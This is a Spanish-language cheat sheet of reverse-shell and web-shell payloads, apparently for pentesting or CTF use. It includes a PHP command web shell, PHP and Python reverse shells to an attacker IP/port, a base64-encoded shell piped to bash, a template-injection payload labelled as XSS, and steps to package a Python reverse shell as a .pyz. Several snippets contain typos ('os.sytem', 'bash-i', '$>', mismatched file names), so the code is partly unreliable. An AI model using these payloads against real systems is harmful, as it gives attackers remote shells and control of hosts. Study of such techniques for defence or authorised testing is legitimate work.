## Desde un archivo php

```bash
<?php

system($_GET[’cmd’]);

$>
```

## Desde la web con php (concatenada a un comando)

```bash
| php -r '$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);’
```

## Desde python

```bash
import os

os.sytem(”bash -c ‘exec bash -i &>/dev/tcp/IP/PORT <&1’”)
```

## Desde url

```bash
http://172.17.0.2/.shell.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/IP/PORT <%261’
```

## Encodeada de Base

```bash
echo “bash -i >& /dev/tcp/IP/PORT 0>&1” | base64 -w 0

test;echo <SHELL_CODEADA> | base64 -d | bash
```

## Desde bash

```bash
echo ‘bash -c “bash-i >& /dev/tcp/IP/PORT 0>&1”’ | bash
```

## Con archivo bash

```bash
#!/bin/bash

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

## Con JavaScript desde un XSS

```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

## Script en Python comprimido .pyz
```bash
#!/bin/python3

# reverse_shell.py
import socket
import subprocess
import os

# Cambia la IP y el puerto a los de tu máquina atacante
HOST = '<IP>'
PORT = <PORT>

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    
    # Redirige la entrada, salida y errores al socket
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # Inicia una shell interactiva
    subprocess.call(['/bin/sh', '-i'])

reverse_shell()
```
```bash
mkdir reverseshell
mv revshell.py reverseshell
python3 -m zipapp reverseshell -o revshell.pyz -m "revshell:revshell"
```
